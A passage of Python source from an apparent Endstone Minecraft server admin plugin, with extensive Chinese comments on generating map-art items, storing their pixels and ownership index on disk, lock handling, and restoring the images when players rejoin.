                return False, "当前 Endstone 不支持创建地图"
        except Exception as e:
            return False, f"创建地图失败: {e}"

        # ★ 用 attach_mapart_renderer 而不是裸 add_renderer：
        # 它保证我们的渲染器排在渲染器列表**末尾**（后画的赢），
        # 并做位置复核。理由见 ImageMapRenderer 的类 docstring ——
        # EndstoneMapView 构造时会先挂一个内置渲染器（画存档像素，
        # 对地图画恒为白色），顺序错了就会把我们的像素洗掉。
        renderer = ImageMapRenderer(pixels)
        attach_mapart_renderer(map_view, renderer)

        item_type = ItemType.get("minecraft:filled_map") or ItemType.get("filled_map")
        if not item_type:
            return False, "无法获取 filled_map 物品类型"
        item_stack = item_type.create_item_stack(1)

        meta = item_stack.item_meta
        if not isinstance(meta, MapMeta):
            from endstone.inventory import ItemMeta
            meta = ItemMeta()
        meta.map_view = map_view
        item_stack.set_item_meta(meta)

        remaining = target.inventory.add_item(item_stack)
        if remaining:
            try:
                dimension.drop_item(target.location, item_stack)
            except Exception as e:
                self.logger.warning(f"背包已满且掉落失败: {e}")
            self.logger.warning(f"{player_name} 背包已满，地图丢在地上")

        # ★ 记账：把地图登记进持久化索引。
        #
        # 放在「发放之后」是有意的 —— 记账失败绝不能连累玩家拿到地图，
        # 所以它整段被 try 包住，且不影响下面的返回值。
        #
        # 为什么必须记账：渲染器是**纯内存态**，玩家一掉线/服务器一重启
        # 就随地图对象一起没了；而地图画从没进过存档（endstone 没有写
        # 存档的 API），所以不记账就**没有任何东西能把它画回来**。
        # 只有记下「谁有哪张图 + 图的像素」，才能在重登时重新补挂渲染器
        # 并补发地图包（见 _restore_mapart_now）。
        marked = False
        try:
            marked = bool(self._record_mapart(int(map_view.id), player_name, image_data))
        except Exception as e:
            self.logger.warning(f"地图画登记失败（不影响本次发放）: {e}")
        # ★ 诊断：把登记结果记下来。这是恢复功能的起点 ——
        # 没记上，后面重登时一定恢复不了，而玩家只会看到"地图还是白的"。
        try:
            if marked:
                self.logger.info(
                    f"[地图画] 已登记：地图 {map_view.id} → {player_name}"
                    f"（像素 {len(image_data)} 字节）")
                # ★ 关键提醒（反汇编确认的机制，见 _restore_mapart_now）：
                # 玩家拿到地图后，像素是靠**发包链路的 hook** 才被填进
                # 地图包的（hook 会调 view->render）。若渲染链路有问题，
                # 此刻看到的就会是白图 —— 而那与"有没有登记"无关，
                # 所以这里给一句指路，避免又绕回索引去查。
                self.logger.info(
                    f"[地图画] 地图 {map_view.id} 已发放。"
                    f"若玩家看到的是白图，请看有没有"
                    f"「渲染器已被调用」那一行："
                    f"有=渲染链路正常，无=渲染器没被用上")
            else:
                self.logger.warning(
                    f"[地图画] 登记失败：地图 {map_view.id} → {player_name}，"
                    f"重登后将无法自动恢复")
        except Exception:
            pass

        # ★★ 锁定：只在**确定能保住画面**时才锁。
        #
        # ⚠ 这里踩过一个坑，别再犯：
        # 最初写的是无条件 ``map_view.locked = True``，理由是「地图画不该被
        # 原版继续探索覆盖」。但 locked 的官方语义是
        #     "A locked map may not be explored further."
        # 也就是说它会**同时禁止原版把地形画上去**。
        #
        # 而插件挂的渲染器是**内存态**，服务器重启必然丢失。于是一个
        # 「锁着 + 渲染器丢了」的地图就进退两难：
        #     * 没有渲染器 → 没人画地图画
        #     * 又被 locked   → 原版也不许画地形
        #     → **永久白板**，比不锁还糟。
        #
        # 所以锁的判据必须是「现在到底有没有渲染器」，而不是「是不是刚发的」：
        #     有渲染器 → 锁，防止原版把地图画覆盖成地形图
        #     没渲染器 → 不锁，放开让原版能探索出地形（至少不是一块白板）
        #
        # 恢复流程（_restore_mapart_now）遵循同样的判据：补挂成功才锁。
        self._apply_map_lock(map_view)

        try:
            target.send_message(
                "§c[警告] §e你收到了一张地图画，该地图渲染可能不稳定，请勿在低版本客户端使用。"
            )
        except Exception:
            pass

        self.logger.info(f"为 {player_name} 生成地图，ID={map_view.id}")
        note = "" if marked else "（未能登记，重登后可能无法恢复）"
        return True, f"已为 {player_name} 生成地图，ID: {map_view.id}（已发放）{note}"

    # ------------------------------------------------- 地图画持久化与恢复
    #
    # 背景：地图画为什么会变白
    # ------------------------
    # 两层原因，都得治：
    #
    # 1) **渲染器是内存态，重启必丢；像素也从没进过存档。**
    #    endstone 没有任何 API 能把插件画的像素写进存档
    #    （``MapItemSavedData::getPixels()`` 在全运行时只有一个调用者，
    #      就是内置渲染器，且只读）。所以渲染器一没，地图画就**无处可寻**。
    #
    # 2) **地图对象天生带一个内置渲染器**（EndstoneMapView 构造函数里挂的），
    #    它画的是**存档像素** —— 对地图画而言恒为全 0 = 纯白。
    #    而 ``EndstoneMapView::render(player)`` 是**顺序遍历**渲染器、
    #    每个都往同一张 canvas 上画、各自先 setBase 打底 —— **后画的赢**。
    #    所以我们的渲染器必须排在**末尾**，否则会被内置那个洗成白色。
    #    ⚠ 也正因为内置渲染器恒存在，**绝不能**用
    #    ``len(view.renderers)`` 判断"我们的渲染器还在不在"。
    #
    # 玩家掉线重连后，客户端贴图缓存已经清空；服务端又认为「早就发过了」，
    # 不再补发 —— 两边都以为对方有，玩家看到的就是一张白图。
    #
    # 解法不是"再画一遍"，而是**做两件事**：
    #   (a) 用磁盘上的 BMP 把我们的渲染器补挂回去（且必须排在末尾）；
    #   (b) **主动把地图整个推给玩家**：
    #
    #     player.send_map(map_view)
    #
    # 官方文档对它的说明正是这个用途：
    #   "Render a map and send it to the player in its entirety.
    #    This may be used when streaming the map in the normal manner
    #    is not desirable."
    #
    # 存储布局
    # --------
    #   <data_dir>/mapart_data/mapart.json        索引：谁有哪些地图
    #   <data_dir>/mapart_data/<id>.bmp           像素（正数 123.bmp / 负数 n123.bmp）
    #
    # ★ v6.16.39：统一收进 data_dir（Endstone data_folder = plugins/GreenMoon面板/）
    # 以前放在「插件包内」（``__file__`` 同级），理由是"跟着插件走方便备份"。
    # 实测证明这个理由是错的：部署后插件包并不在 plugins/<插件名>/，
    # 而是被 Endstone 装到 ``plugins/.local/.../dist-packages/admin_web/``
    # （见 plugin_loader.py 的 ``self._prefix = os.path.join("plugins", ".local")``），
    # 那是**框架的派生目录**，随时可能被重建/清理 —— 地图画放那儿会莫名其妙丢失。
    # 地图画是**用户数据**，必须和其它用户数据一样跟 data_folder 走。
    #
    # 为什么原样存 BMP 而不是存像素/转码：
    #   _execute_map 的输入本来就是 24 位无压缩 BMP，存原始字节 → 恢复时
    #   直接喂给同一个 decode_bmp_24bit → **来回零转换、零精度损失**。
    #   代价只是每张几十 KB，而这是本机磁盘读写，完全可接受。

    #: 地图画数据在插件数据目录里的子目录名。
    _MAPART_SUBDIR = "mapart_data"

    def _mapart_root(self):
        """地图画数据的根目录 = ``data_dir/mapart_data``（唯一来源，无回退）。

        ★ v6.16.39 改造说明
        -------------------
        旧实现的候选顺序是 ``[插件包目录, data_dir]``，即**优先插件包目录**，
        兜底才用 data_dir。问题在于"插件包目录"在部署后是
        ``plugins/.local/.../dist-packages/admin_web/`` —— Endstone 装 wheel
        的派生目录，随时会被重建/清理，地图画放那儿必然丢。

        现在改成**只认 data_dir**，与配置、备份、子插件、日志完全一致：
        用户的插件数据全都集中在 ``plugins/GreenMoon面板/`` 下，
        备份/迁移/排查都只需看一个地方。

        可用 ``_mapart_root_override`` 覆盖「数据目录」（测试用；正常运行
        时该属性不存在）。注意覆盖的是**数据目录**，子目录 ``mapart_data``
        仍然会拼上去 —— 这样测试和生产走完全相同的目录层级，
        避免"测试通过但结构不一样"。
        """
        override = getattr(self, "_mapart_root_override", None)
        if override:
            try:
                d = Path(override) / self._MAPART_SUBDIR
                d.mkdir(parents=True, exist_ok=True)
                return d
            except Exception:
                pass

        base = getattr(self, "data_dir", None)
        if base is None:
            try:
                self.logger.warning("地图画：data_dir 不可用，地图画功能降级")
            except Exception:
                pass
            return None

        d = Path(base) / self._MAPART_SUBDIR
        try:
            d.mkdir(parents=True, exist_ok=True)
            # 真写一下就验明可写性 —— mkdir 成功不代表能创建文件
            # （只读挂载/权限位异常时表现不一致）。
            probe = d / ".write_test"
            probe.write_bytes(b"")
            try:
                probe.unlink()
            except Exception:
                pass
        except Exception as e:
            try:
                self.logger.warning(f"地图画目录不可用 {d}: {e}")
            except Exception:
                pass
            return None
        return d

    def _mapart_dir(self):
        """返回地图画像素目录（并确保存在）。失败返回 None。"""
        return self._mapart_root()

    def _mapart_index_path(self):
        """地图画索引文件路径（与像素目录同级，都在 data_dir 内）。"""
        d = self._mapart_root()
        if d is None:
            return None
        return d / "mapart.json"

    def _mapart_migrate_old(self, new_dir):
        """【v6.16.39 起为兼容占位，不再做任何迁移】

        历史背景
        --------
        本方法此前负责把老位置的 ``data_dir/mapart.json`` +
        ``data_dir/mapart/<id>.bmp`` 搬到「插件包内」的新目录。

        为什么现在留空
        --------------
        本次改造把地图画的**目标目录改回了 ``data_dir/mapart_data/``**，
        于是产生三种历史位置：

        * ``<插件包>/mapart_data/``        上一版的目标（插件包内）
        * ``data_dir/mapart/`` + ``data_dir/mapart.json``   更早的版本
        * ``data_dir/mapart_data/``        本次的目标

        交付口径决定**不做自动迁移**：宁可让用户按报告里的说明手工搬一次，
        也不想在启动时静默合并三套来源 —— 合并涉及索引结构差异
        （老索引可能缺 ``ts`` 字段），静默合并有把用户数据改坏的风险。

        保留这个空方法是为了不打断可能的调用点（历史版本散布在
        ``_mapart_root`` 等处）；它现在什么都不做，也永远不会抛异常。
        若将来要恢复自动迁移，请参考交付报告"老数据搬迁"一节实现，
        并务必先归一化索引结构再合并。
        """
        return

    def _mapart_file_name(self, map_id):
        """地图 ID → 像素文件名。

        ⚠ 为什么不直接用 ``f"{map_id}.bmp"``：地图 ID 是**有符号** 64 位，
        负数会出现 ``-219043332039.bmp`` 这种文件名。前导 ``-`` 在部分
        文件系统、打包工具、SSH/SCP 命令行里都要额外转义，很容易在某处
        被吃掉或报错。更糟的是运维手工排查时，``rm -219043332039.bmp``
        会被当成参数解析。

        所以做一次确定性编码：正数 ``123.bmp``，负数 ``n219043332039.bmp``。
        纯 ASCII、无特殊字符、正负不撞名、可肉眼反推。

        刻意写成普通方法而不是 ``@staticmethod``：测试脚本会把这个方法
        单独抠出来重装到假插件上跑，带装饰器会让签名对不上（与
        ``_pixels_ok`` 是同一个理由）。
        """
        try:
            mid = int(map_id)
        except (TypeError, ValueError):
            return None
        return f"n{-mid}.bmp" if mid < 0 else f"{mid}.bmp"

    def _apply_map_lock(self, view):
        """按「我们自己的渲染器在不在」决定这张地图锁不锁。

        这是本功能里**最容易写错**的一处，所以单独抽成一个方法，
        让生成路径和恢复路径共用同一套判据，避免两边慢慢长歪。

        ``locked`` 的官方语义（endstone 0.11.10）::

            Whether the map is locked or not.
            A locked map may not be explored further.

        关键在于它**同时**做了两件事：
          * 不让原版地图机制把地形画上去（—— 这正是地图画需要的）
          * 一旦锁上就不会再自动解锁，重启也不会

        而挂在地图上的渲染器是**纯内存态**，服务器重启必然丢失。所以：

            有渲染器 + 锁上   → 画面正确，且不会被地形覆盖     ✅ 理想
            无渲染器 + 锁上   → 没人画地图画，原版也不许画地形  ❌ 永久白板
            无渲染器 + 不锁   → 原版会探索出地形                ⚠ 画面丢了，但可用

        第三条虽然丢了地图画，但**至少不是一块焊死的白板** ——
        这比第二条好得多。所以判据是「有没有渲染器」，不是「是不是刚发的」。

        ★★ 这里的「有没有渲染器」必须是**我们自己的**，不能数总数。
        用户日志里「现有渲染器 1 个」就是这么被误读的：
        ``EndstoneMapView`` 构造时会自动挂一个内置
        ``EndstoneMapRenderer``（画存档像素），所以任何地图**天生就有 1 个**。
        数总数会让 ``have`` 恒为 True —— 于是永远锁上，而我们的渲染器
        早丢了，正好造出上面第二条描述的**永久白板**。
        改用 ``has_mapart_renderer`` 按类型认人（见 web.py 的说明）。

        返回最终是否处于锁定态。失败一律按「不锁」处理（宁可丢画面，
        也不能造出永久白板）。
        """
        try:
            have = bool(has_mapart_renderer(view, ImageMapRenderer))
        except Exception:
            have = False
        try:
            view.locked = bool(have)
            return bool(have)
        except Exception:
            return False

    def _mapart_load(self):
        """读取地图画索引，并做**结构自愈**。

        索引文件是手工可编辑的，也可能在断电时被写坏。所以这里不信任
        内容：字段类型不对就就地归一化，任何异常都退回空索引。
        返回的结构保证是 ``{"maps": dict, "players": dict}``。

        索引位置见 ``_mapart_index_path``（data_dir 内，与像素文件同级）。
        """
        empty = {"maps": {}, "players": {}}
        try:
            p = self._mapart_index_path()
            if p is None or not p.is_file():
                return empty
            with open(p, "r", encoding="utf-8") as f:
                d = json.load(f)
        except Exception:
            return empty
        if not isinstance(d, dict):
            return empty

        maps = d.get("maps")
        players = d.get("players")
        if not isinstance(maps, dict):
            maps = {}
        if not isinstance(players, dict):
            players = {}

        # 逐条校验：ID 必须是整数，owner 必须是非空字符串。
        # 坏条目直接丢弃 —— 留着只会在恢复时制造无意义的报错。
        #
        # ⚠ 别再加「ID 必须 > 0」这种判断，踩过大坑：
        # Bedrock 的地图 ID 就是 ActorUniqueID，是**有符号 64 位整数**，
        # 完全可能是负数（实测见过 -219043332039）。当初想当然地按
        # 「地图 ID 是正整数」过滤，结果玩家一发图就登记失败：
        #     [地图画] 登记失败：地图 -219043332039 → xxx，重登后将无法自动恢复
        # 所以这里只要求「是个 int」，不要求符号。
        # bool 要单独排除 —— isinstance(True, int) 是 True，
        # 而 True 一旦混进来会变成 map_id=1，是纯粹的数据污染。
        clean_maps = {}
        for k, v in maps.items():
            try:
                mid = int(k)
            except (TypeError, ValueError):
                continue
            if isinstance(k, bool) or not isinstance(v, dict):
                continue
            owner = str(v.get("owner") or "").strip()
            if not owner:
                continue
            try:
                ts = float(v.get("ts") or 0)
            except (TypeError, ValueError):
                ts = 0.0
            clean_maps[mid] = {"owner": owner, "ts": ts}

        # players 索引以 maps 为准重建 —— 两边不一致时，maps 是权威。
        # 这样即使 players 被手工改坏，也能自动找回正确归属。
        by_player = {}
        for mid, info in clean_maps.items():
            by_player.setdefault(info["owner"], []).append(mid)
        for name in by_player:
            by_player[name].sort()

        return {"maps": clean_maps, "players": by_player}

    def _mapart_save(self, data):
        """原子写回索引。失败返回 False（不抛）。

        用 ``atomic_write_json`` 而不是 ``_json_save``：后者把路径隐式绑定在
        ``data_dir`` 上，而地图画索引要走 ``_mapart_root`` 解析出的目录
        （当前也是 data_dir，但经 override 可重定向，测试要用）。
        原子写的语义两者一致 —— 同目录临时文件 + fsync + os.replace。
        """
        try:
            p = self._mapart_index_path()
            if p is None:
                return False
            return bool(atomic_write_json(p, data, indent=2, ensure_ascii=False))
        except Exception:
            return False

    def _record_mapart(self, map_id, owner, image_data):
        """登记一张地图画：落盘像素 + 更新双向索引。

        返回是否成功。**调用方已经把本方法包在 try 里**，所以这里
        只保证不抛、返回值可判。
        """
        # bool 要在 int() 之前挡 —— isinstance(True, int) 为真，
        # 转完就分不出来了（True 会悄悄变成 map_id=1）。
        if isinstance(map_id, bool):
            return False
        try:
            map_id = int(map_id)
        except (TypeError, ValueError):
            return False
        owner = str(owner or "").strip()
        # ⚠ 不要判 map_id <= 0 —— 地图 ID 是**有符号** 64 位（见
        # _mapart_load 的注释），负数完全合法。判正负会把所有负 ID 的
        # 地图画都变成"登记失败"，玩家看到的却是"生成成功"，极难查。
        if not owner:
            return False
        if not image_data:
            return False

        d = self._mapart_dir()
        if d is None:
            return False

        try:
            # 文件名带上符号会让负 ID 变成 "-219043332039.bmp"，
            # 在部分文件系统/工具链上容易出幺蛾子。这里统一做一次
            # 「把符号映射成前缀」的编码，正负 ID 都不会撞名。
            if not atomic_write_bytes(d / self._mapart_file_name(map_id), image_data):
                return False
        except Exception:
            return False

        with self._store_lock():
            cur = self._mapart_load()
            maps = cur["maps"]

            # 同一张地图若之前登记在别人名下，先从旧主人的列表里摘掉。
            # （理论上 ID 不会重复，但服务端存档回滚等情况下可能出现。）
            old = maps.get(map_id)
            if old and old.get("owner") != owner:
                old_list = cur["players"].get(old["owner"]) or []
                cur["players"][old["owner"]] = [i for i in old_list if i != map_id]

            maps[map_id] = {"owner": owner, "ts": time.time()}
            lst = cur["players"].get(owner) or []
            if map_id not in lst:
                lst.append(map_id)
                lst.sort()
            cur["players"][owner] = lst

            return self._mapart_save(cur)

    def _forget_mapart(self, map_id):
        """注销一张地图画：删像素文件 + 摘索引。

        当前恢复流程用不到它，留给将来的「玩家删图」「清理失效记录」用 ——
        有注销能力，索引才不会只增不减。
        """
        try:
            map_id = int(map_id)
        except (TypeError, ValueError):
            return False

        ok = False
        with self._store_lock():
            cur = self._mapart_load()
            info = cur["maps"].pop(map_id, None)
            if info:
                owner = info.get("owner")
                lst = cur["players"].get(owner) or []
                cur["players"][owner] = [i for i in lst if i != map_id]
                if not cur["players"][owner]:
                    cur["players"].pop(owner, None)
                ok = self._mapart_save(cur)

        d = self._mapart_dir()
        if d is not None:
            try:
                fn = self._mapart_file_name(map_id)
                if fn:
                    p = d / fn
                    if p.exists():
                        p.unlink()
            except Exception:
                pass
        return ok

    def _mapart_of(self, player_name):
        """查某个玩家名下的地图 ID 列表（只读，返回副本）。"""
        try:
            name = str(player_name or "").strip()
            if not name:
                return []
            with self._store_lock():
                cur = self._mapart_load()
                return list(cur["players"].get(name) or [])
        except Exception:
            return []

    def _mapart_has(self, map_id):
        """这张地图是不是我们管过的地图画？

        给 ``on_map_initialize`` 用 —— 那个事件触发极频繁，
        所以这里只做一次字典查表。**绝不读盘**（索引本身是个小 JSON，
        每次地图初始化都读一遍磁盘是不可接受的）。
        """
        try:
            mid = int(map_id)
        except (TypeError, ValueError):
            return False
        try:
            with self._store_lock():
                return mid in self._mapart_load()["maps"]
        except Exception:
            return False

    def _restore_mapart_async(self, player, player_name):
        """后台线程入口：读索引 + 读像素 → 回主线程补发。

        为什么要绕后台线程：``on_player_join`` 跑在主线程（也就是 tick 线程），
        恢复要读磁盘 —— 每人几张、每张几十 KB，在主线程里读会直接卡 tick。
        这里先把该读的都读完，再一次性交给主线程，主线程只做「发」这一个动作。

        这个模式与既有的 ``_cross_restore_async`` 完全一致，不另发明一套。

        延迟 2 秒：玩家刚进服那一瞬间，客户端还在收区块、服务端还在补资源，
        这时候塞贴图包容易丢。等两秒更稳 —— 而 sleep 在后台线程里，不阻塞 tick。
        """
        try:
            name = str(player_name or "").strip()
            if not name:
                return

            ids = self._mapart_of(name)
            # ★ 诊断日志：恢复流程的每一步都要留痕。
            # 这个功能横跨「磁盘 / 主线程 / 客户端缓存」三层，一旦哪里断链，
            # 从外部看就是「地图还是白的」——完全无法区分是没记录、没读到、
            # 还是发了但客户端没收。所以每一步都打点，出问题一眼看出卡在哪。
            self.logger.info(
                f"[地图画恢复] {name} 进服，索引里有 {len(ids)} 张：{ids}")
            if not ids:
                return

            try:
                time.sleep(2.0)
            except Exception:
                pass

            # 读盘阶段：只做 IO，不碰 server。
            # 索引里有、磁盘上没有的条目直接跳过 —— 这正是"跳过该张、
            # 其余正常"这条边界的落点。
            d = self._mapart_dir()
            self.logger.info(f"[地图画恢复] 像素目录 = {d}")
            payload = []
            for mid in ids:
                data = None
                fn = self._mapart_file_name(mid)
                if d is not None and fn:
                    try:
                        p = d / fn
                        if p.is_file():
                            with open(p, "rb") as f:
                                data = f.read()
                    except Exception as e:
                        self.logger.warning(
                            f"[地图画恢复] 读取 {fn} 失败：{e}")
                        data = None
                self.logger.info(
                    f"[地图画恢复] 地图 {mid}：本地像素文件 {fn}，"
                    f"{'已读到 ' + str(len(data)) + ' 字节' if data else '缺失'}")
                payload.append((mid, data))

            # 回主线程补发。
            # 超时给得比常规宽（10s）：张数多时主线程要把每张的像素都推一遍。
            try:
                ret = self._run_in_server_thread(
                    self._restore_mapart_now, player, payload, timeout=10.0)
                # ★ 诊断：调度失败和"跑到了但一张没成功"必须能区分开。
                # _run_in_server_thread 失败时返回 (False, 原因)。
                if ret is not True and not isinstance(ret, int):
                    self.logger.warning(
                        f"[地图画恢复] 主线程调度未完成：{ret!r}")
                else:
                    self.logger.info(
                        f"[地图画恢复] 主线程执行完毕，成功张数 = {ret!r}")
                    if ret:
                        return
            except Exception as e:
                self.logger.warning(f"[地图画恢复] 调度回主线程异常：{e}")

            # ★★ 兜底：主线程那条路没成功，再退一步用**调度器轮询**重试。
            #
            # 为什么还要这一层：上面那句依赖 _run_in_server_thread 的语义，
            # 而它的失败模式里有一个很隐蔽的——"主线程任务执行超时"时它
            # **只返回失败、不取消已排队的任务**。于是可能出现「恢复其实
            # 跑成功了，但线程已经放弃等待、player 对象也过期了」这种
            # 竞态。更糟的是在 10s 之后经手一个陈旧 player 对象。
            #
            # 这里改用「每 tick 回调」的方式：把恢复动作塞进调度器，
            # 由调度器在**它自己的主线程**上执行，不依赖跨线程等待，
            # 也不需要在后台线程里持有 player 那么久。
            self._schedule_mapart_retry(player, payload, attempt=1)
        except Exception as e:
            self.logger.warning(f"[地图画恢复] 后台流程异常：{e}")

    def _schedule_mapart_retry(self, player, payload, attempt=1):
        """用调度器把恢复动作再排一次（兜底路径，最多两轮）。

        与 ``_restore_mapart_async`` 的差别：这里不再起线程、不再 sleep、
        不再跨线程等待 —— 直接让调度器在下一个 tick 里执行
        ``_restore_mapart_now``。执行结果通过闭包变量回看。

        ``attempt`` 用于限流：恢复失败最坏情况是玩家没看到地图画，
        但它**绝不会**因此卡住 tick，所以两轮足够，不搞无限重试。
        """
        try:
            holder: Dict[str, Any] = {}

            def _tick_task():
                try:
                    n = self._restore_mapart_now(player, payload)
                    holder["n"] = n
                    if not n and attempt < 2:
                        # 一张都没成功：再排一轮。
                        # 放到下一 tick 而不是立刻重排，避免和还在排队里的
                        # 上一轮任务打架（_run_in_server_thread 超时后任务
                        # 仍留在队列里，可能马上就会跑）。
                        try:
                            self.server.scheduler.run_task(
                                self,
                                lambda: self._schedule_mapart_retry(player, payload, attempt + 1),
                            )
                        except Exception:
                            pass
                    return None
                except Exception as e:
                    try:
                        self.logger.warning(f"[地图画恢复] 兜底重试异常：{e}")
                    except Exception:
                        pass
                    return None

            self.server.scheduler.run_task(self, _tick_task)
            self.logger.info(
                f"[地图画恢复] 已排入兜底重试（第 {attempt} 轮），"
                f"{len(payload)} 张")
        except Exception as e:
            try:
                self.logger.warning(f"[地图画恢复] 兜底重试排期失败：{e}")
            except Exception:
                pass

    def _restore_mapart_now(self, player, payload):
        """**主线程**：把 ``payload`` 里的地图逐张补发给玩家。

        ``payload`` 形如 ``[(map_id, bmp_bytes_or_None), ...]``。

        幂等性说明
        ----------
        ``_run_in_server_thread`` 超时后**不会取消**已排队的任务（超时分支
        只记日志就返回，task 仍在队列里，稍后照样执行）。所以本方法可能被
        执行两次，必须保证重复执行无副作用 —— ``send_map`` 是幂等的
        （重发一遍贴图包而已），``locked`` 设两次也无所谓，补挂渲染器前
        会先检查 ``renderers`` 是否为空。因此天然幂等。

        每张地图独立 try/except：一张坏掉绝不能影响其余的张。
        **本方法在任何情况下都不抛异常。**
        """
        if not payload:
            return 0

        restored = 0
        for mid, data in payload:
            try:
                # ★ 现取现用，绝不缓存 MapView。
                # server.get_map() 返回的是 C++ 侧包装对象，地图被卸载/
                # 存档重载后就会悬空 —— 持有它当缓存迟早出问题。
                view = None
                try:
                    view = self.server.get_map(int(mid))
                except Exception:
                    view = None

                if view is None:
                    self.logger.warning(
                        f"[地图画恢复] 地图 {mid}：server.get_map() 返回 None，"
                        f"该地图不存在（可能已被删除），跳过")
                    continue

                # ★ 诊断：把"查到的对象到底是什么状态"记下来。
                #
                # ⚠ 上一版这里只打「现有渲染器 N 个」，结果**误导了自己**：
                # EndstoneMapView 构造时会自动挂一个内置渲染器（画存档像素），
                # 所以 N 永远是 1，看起来"渲染器还在"。现在把**内置**和
                # **我们的**分开数，一眼就能看出我们的渲染器丢没丢。
                try:
                    _all_r = list(view.renderers or [])
                except Exception as e:
                    _all_r = []
                    _r_err = f"读取失败({e})"
                else:
                    _r_err = ""
                _n_r = len(_all_r)
                try:
                    _n_ours = sum(
                        1 for r in _all_r if isinstance(r, ImageMapRenderer))
                except Exception:
                    _n_ours = "?"
                try:
                    _lk = bool(view.locked)
                except Exception as e:
                    _lk = f"读取失败({e})"
                try:
                    _vid = int(view.id)
                except Exception:
                    _vid = "?"
                self.logger.info(
                    f"[地图画恢复] 地图 {mid}：已取回视图（id={_vid}），"
                    f"渲染器共 {_n_r} 个（其中我们的 {_n_ours} 个），"
                    f"locked={_lk}"
                    + (f" [{_r_err}]" if _r_err else ""))
                if _n_r > 0 and _n_ours == 0:
                    # 这一条是白图 bug 的直接证据，必须显式说出来，
                    # 否则下一个人又会把"共 1 个"读成"渲染器还在"。
                    self.logger.info(
                        f"[地图画恢复] 地图 {mid}：那 {_n_r} 个是 endstone 的**内置**"
                        f"渲染器（画存档像素，对地图画恒为白色），"
                        f"不是我们的 —— 我们的已丢失，将重新补挂")

                # 渲染器丢了就补挂。
                #
                # 这是本方案能覆盖「服务端重启」的原因：重启后地图对象
                # 仍在存档里，但挂在它上面的渲染器是内存态、必然丢失。
                # 只要 BMP 还在，就能重建一个等价的渲染器 —— 像素完全一致。
                #
                # 补挂前会先验尺寸：坏数据绝不能进入渲染流程，
                # 否则会在 tick 里抛异常，比画错严重得多。
                #
                # ⚠ 这里有一个必须兜住的失败路径：**补挂失败时必须解锁**。
                # 若地图还留着上次设的 locked=True，而渲染器又没补上，
                # 就会变成「没人画地图画 + 原版也不许画地形」= 永久白板。
                # 所以下面每一条 continue 之前都要先解锁。
                # ★★ 判据必须是"有没有**我们的**渲染器"，不是"总数是否为空"。
                #
                # 用户日志里那句「现有渲染器 1 个」是本 bug 的误判之源：
                # EndstoneMapView 构造时会自动挂一个**内置**
                # EndstoneMapRenderer（画存档像素，对地图画恒为全 0 = 白）。
                # 所以任何地图天生就有 1 个渲染器 —— 数总数永远 >= 1，
                # 于是恢复逻辑以为"渲染器还在"就什么都不做，
                # 而真正画地图画的那个早就随重启没了。**白图就这么来的。**
                #
                # 所以改用 has_mapart_renderer：按类型认人（isinstance），
                # 内置那个是 C++ 对象，绝不可能是 Python 类的实例。
                try:
                    have = has_mapart_renderer(view, ImageMapRenderer)
                except Exception:
                    have = False
                if not have:
                    if not data:
                        self.logger.warning(
                            f"[地图画恢复] 地图 {mid}：没有我们的渲染器且本地无像素"
                            f"文件，跳过（已解锁，交还原版探索）")
                        self._apply_map_lock(view)
                        continue
                    try:
                        pixels = decode_bmp_24bit(data)
                    except Exception as e:
                        self.logger.warning(
                            f"[地图画恢复] 地图 {mid}：像素解码失败（{e}），"
                            f"跳过（已解锁，交还原版探索）")
                        self._apply_map_lock(view)
                        continue
                    if not self._pixels_ok(pixels):
                        self.logger.warning(
                            f"[地图画恢复] 地图 {mid}：像素尺寸不合法，"
                            f"跳过（已解锁，交还原版探索）")
                        self._apply_map_lock(view)
                        continue
                    # ★ 用 attach_mapart_renderer 而不是裸 add_renderer：
                    # 它保证我们的渲染器排在列表**末尾**（后画的赢），
                    # 并做位置复核。理由见 ImageMapRenderer 的类 docstring。
                    try:
                        ok_attach = attach_mapart_renderer(
                            view, ImageMapRenderer(pixels))
                        if ok_attach:
                            self.logger.info(
                                f"[地图画恢复] 地图 {mid}：渲染器已补挂成功"
                                f"（已确认排在末尾）")
                        else:
                            self.logger.warning(
                                f"[地图画恢复] 地图 {mid}：渲染器补挂后未能确认"
                                f"排在末尾（顺序可能有误），继续尝试发送")
                    except Exception as e:
                        self.logger.warning(
                            f"[地图画恢复] 地图 {mid}：补挂渲染器失败（{e}），"
                            f"跳过（已解锁，交还原版探索）")
                        self._apply_map_lock(view)
                        continue

                # 锁定与否交给统一判据：有渲染器才锁。
                # 走到这里渲染器必然存在（要么本来就在，要么刚补上），
                # 所以正常情况下会锁上 —— 但判据仍走同一条路，不搞特例。
                self._apply_map_lock(view)

                # ★ 真正的恢复动作：把整张地图推给玩家。
                #
                # ⚠ 重要认知（反汇编 endstone 0.11.10 确认），别再被误导：
                # ``send_map`` **自己发的是一张全 0 的白图**（packet 里
                # 硬编码 128×128 并 resize 成全 0）。真正把我们的像素填
                # 进去的是**发包链路上的 hook**：
                #     BatchedNetworkPeer::sendPacket 发现待发的是地图包
                #       → 调 view->render(player)
                #       → 用渲染结果覆盖 packet.pixels
                # 而 ``render()`` 在整个运行时**只有这一个调用点**。
                #
                # 所以「send_map 执行成功」≠「画面出来了」：
                # 前者只说明包发出去了，后者还取决于 render() 有没有被
                # 触发、渲染器有没有被原版用上。
                # 这个二分法靠渲染器自己的首次调用日志来看（见
                # ImageMapRenderer.render 的埋点）——日志里出现
                # 「[地图画] 渲染器已被调用」= 渲染链路是通的。
                player.send_map(view)
                restored += 1

                # 把恢复后的关键状态一次记全，省得再来回问。
                try:
                    _n_after = len(list(view.renderers or []))
                except Exception:
                    _n_after = "?"
                try:
                    _lk_after = bool(view.locked)
                except Exception:
                    _lk_after = "?"
                self.logger.info(
                    f"[地图画恢复] 地图 {mid}：send_map 已执行 ✓"
                    f"（渲染器 {_n_after} 个，locked={_lk_after}）"
                    f" —— 若画面仍空白，请看日志里有没有"
                    f"「渲染器已被调用」那一行："
                    f"有=渲染链路正常（像素问题），"
                    f"无=渲染器没被原版用上（挂载问题）")
            except Exception as e:
                try:
                    self.logger.warning(
                        f"[地图画恢复] 地图 {mid}：处理失败（{e}），跳过")
                except Exception:
                    pass

        if restored:
            try:
                player.send_message(f"§a[地图画] §e已为你恢复 {restored} 张地图画。")
            except Exception:
                pass
            try:
                self.logger.info(
                    f"已为 {getattr(player, 'name', '?')} 恢复 {restored} 张地图画")
            except Exception:
                pass
        return restored

    def _pixels_ok(self, pixels):
        """校验点阵是合法的 128×128 RGB —— 坏数据不许进渲染流程。

        刻意写成普通方法（而不是 ``@staticmethod``）：测试脚本会把这个方法
        单独抠出来重装到假插件上跑，带装饰器会让签名对不上。
